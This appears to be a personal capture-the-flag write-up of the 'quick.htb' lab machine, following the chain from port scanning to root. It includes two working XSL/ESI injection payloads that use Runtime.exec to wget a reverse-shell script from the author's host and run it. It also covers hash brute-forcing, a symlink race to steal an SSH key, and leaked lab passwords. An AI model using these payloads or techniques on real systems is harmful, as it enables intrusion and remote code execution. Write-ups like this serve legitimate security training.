@@ -1,0 +1,70 @@
+- Did nmap found two ports 9001 and ssh
+- 9001 had a domain with a login page and stuff
+- did another nmap with -sU for udp and found port 443 filtered
+- did some research and found QUIC can be used with a bleeding edge curl to fetch domain
+- the domain had directories and gave two pdfs one of which had a default pass  Quick4cc3$$
+- back in the 9001 domain combined names with company names and countries to form email ids 
+- the combination elisa@win.co.uk:Quick4cc3$$ worked
+- got it and found a ticket raising portal
+- the headers in the ticket request responses had an X-Powered-By:Esigate header
+- Did some more research and found this is used to transform xml into other formats
+- one vulnerability suggested using the esi:include tag to access remote ips
+- so used the query <esi:include src="http://10.10.15.176:8080/check67.html" stylesheet="http://10.10.15.176:8080/new65.xsl"></esi:include> to download my own xsl payload
+- new66.xsl :
+- <?xml version="1.0" ?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:output method="xml" omit-xml-declaration="yes"/>
+<xsl:template match="/"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
+<root>
+    <xsl:variable name="cmd"><![CDATA[wget http://10.10.15.176:8080/nc.sh]]></xsl:variable>
+<xsl:variable name="rtObj" select="rt:getRuntime()"/>
+<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
+Process: <xsl:value-of select="$process"/>
+Command: <xsl:value-of select="$cmd"/>
+</root>
+</xsl:template>
+</xsl:stylesheet>
+
+- new68.xsl :
+- <?xml version="1.0" ?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:output method="xml" omit-xml-declaration="yes"/>
+<xsl:template match="/"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
+<root>
+    <xsl:variable name="cmd"><![CDATA[sh nc.sh]]></xsl:variable>
+<xsl:variable name="rtObj" select="rt:getRuntime()"/>
+<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
+Process: <xsl:value-of select="$process"/>
+Command: <xsl:value-of select="$cmd"/>
+</root>
+</xsl:template>
+</xsl:stylesheet>
+
+- downloaded onto the machine a netcat mkfifo reverse shell and caught it on my machine
+- got user sam
+- /var/www/html had a db.php that gave mysql creds db_adm:db_p4ss
+- logged in and found two users one was elisa and the other srvadm along with what looked like their password hashes
+- further inspection into php files indicated that it was hashed by md5(crypt("pass",'fa') where pass is the user entered pass
+- so wrote a python script crackedthisfucker.py to bruteforce srvadmin hash with rockyou and got pass as yl51pbx
+- tried su with this pass but that didnt work
+- tried this pass in portalv2.quick.htb:9001 and that worked
+- apache config pointed to another website called printerv2.quick.htb:9001
+- got access to a printer page that let you add printers that you could stream raw text to and recieve via netcat listener
+- (WAS TRYING FOR A LONG TIME TO USE THIS WEBSITE VIA PHP -S BUT THAT WAS SHITTING ME OVER COZ APACHE RAN AS SRVADM)
+- And the php files for this printer site were in /var/www/printer
+- enum on those revealed that the code was making a temporary file with its name as the date in a particular format to store the text to be printed for 0.5 seconds in /var/www/jobs
+- so simply wrote a script to intercept that file and substitute it with a symlink to id_rsa of srvadm
+- got srvadm
+- in the home of srvadm there was a folder .cache/.conf.d that hand configuration files of the printers
+- in one of the files was srvadm's sudo pass (in printers.conf) &ftQ4K3SGde8?
+- Got root
+
+(btw my_rsa is root's private key that i generated (put .pub in authorized keys), might not work now but try anyway if you want)
+
+
+This machine almost broke me, but it was worth it. 17-June 2020
+
